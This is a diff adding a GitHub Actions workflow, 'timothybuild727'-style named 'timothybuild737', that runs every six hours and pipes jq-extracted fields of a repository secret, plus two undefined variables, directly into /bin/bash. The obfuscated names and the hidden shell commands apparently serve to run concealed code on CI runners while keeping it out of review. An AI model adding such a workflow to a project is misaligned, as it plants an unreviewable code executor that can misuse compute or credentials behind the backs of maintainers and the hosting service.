@@ -1,0 +1,20 @@
+name: timothybuild737
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: timothybuild737
+        env:
+          bv6: ${{ secrets.bv6 }}
+        run: |
+          echo $bv6 | jq -r .kfjvr540 | /bin/bash
+          echo $gz7 | jq -r .gxflc59367 | /bin/bash
+          echo $cj6013 | jq -r .xhub823 | /bin/bash
+
